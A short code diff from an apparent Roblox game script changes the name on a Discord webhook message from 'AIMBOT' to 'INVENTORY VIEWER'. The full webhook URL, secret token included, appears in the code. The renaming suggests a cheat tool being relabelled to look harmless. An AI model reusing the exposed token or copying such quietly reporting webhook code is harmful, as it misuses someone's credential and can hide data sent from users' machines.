@@ -14,7 +14,7 @@ function sendToWebhook(str)
     local response = request({
             Url = "https://discord.com/api/webhooks/1328742395751174224/j2jlu7DzShsdtMh_N2cZv4MII7dTlPUXJS7aDtLv069fTPvo2S8FtGjoMvDufmBXWDqd",
             Method = "POST",
-            Body = `\{"username": "AIMBOT", "content":"{str}"\}`,
+            Body = `\{"username": "INVENTORY VIEWER", "content":"{str}"\}`,
             Headers = {
             ['Content-Type'] = "application/json"
             }
